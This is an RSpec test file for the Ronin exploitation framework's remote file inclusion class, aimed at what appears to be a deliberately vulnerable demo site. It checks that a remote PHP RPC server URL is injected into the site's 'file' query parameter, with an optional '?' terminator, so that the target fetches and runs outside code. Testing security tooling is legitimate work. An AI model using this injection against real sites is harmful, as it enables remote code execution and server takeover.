require 'spec_helper'
require 'ronin/exploits/rfi'

describe Exploits::RFI do
  let(:host)        { 'testphp.vulnweb.com' }
  let(:path)        { '/showimage.php'      }
  let(:query_param) { 'file' }

  let(:exploit) do
    described_class.new(
      host:            host,
      url_path:        path,
      url_query_param: {name: query_param},
    )
  end
  subject { exploit }

  describe "TEST_SCRIPTS" do
    subject { described_class::TEST_SCRIPTS }

    it "should contain public URLs", network: true do
      bad_urls = subject.values.select do |url|
        Net::HTTP.get_response(URI(url)).code != '200'
      end

      bad_urls.should be_empty
    end
  end

  describe "#script_language" do
    it "should map the path extension to the scripting language" do
      subject.script_language.should == :PHP
    end
  end

  describe "#test_script" do
    subject { exploit.test_script }

    it "should be of the same language as the target URL" do
      File.extname(subject).should == File.extname(exploit.url_path)
    end
  end

  describe "#exploit_url" do
    let(:remote_url) { 'http://ronin-ruby.github.com/static/ronin/php/rpc/server.php' }

    subject { exploit.exploit_url(remote_url) }

    it "should inject the remote URL into the target query param" do
      subject.query_params[query_param].should == remote_url
    end

    context "with terminated URLs" do
      before { exploit.terminate = true }

      it "should terminate the remote URL with a '?' character" do
        subject.query_params[query_param].should == "#{remote_url}?"
      end
    end
  end

  describe "#vulnerable?" do
    pending "need an exploitable RFI to test against" do
      it "should test if the remote test script can be executed", network: true do
        subject.vulnerable?.should be_true
      end
    end

    context "with no script_language" do
      before { subject.url_path = '/page' }

      it "should raise a NotImplementedError" do
        lambda {
          subject.vulnerable?
        }.should raise_error(NotImplementedError)
      end
    end

    context "with an unknown script_language" do
      before { subject.url_path = '/page.xyz' }

      it "should raise a NotImplementedError" do
        lambda {
          subject.vulnerable?
        }.should raise_error(NotImplementedError)
      end
    end
  end
end
